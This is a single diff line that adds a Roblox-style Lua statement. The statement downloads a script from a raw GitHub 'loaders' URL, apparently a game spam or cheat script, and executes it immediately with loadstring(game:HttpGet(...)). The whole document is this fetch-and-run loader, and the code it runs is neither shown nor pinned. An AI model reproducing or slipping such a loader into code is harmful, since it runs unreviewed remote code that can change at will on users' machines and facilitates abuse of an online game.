@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/SmartHammerAnimate/loaders/main/loaders/catastrophic-horse-racing-spam3-pr2f19s5o3jv30.lua"))()
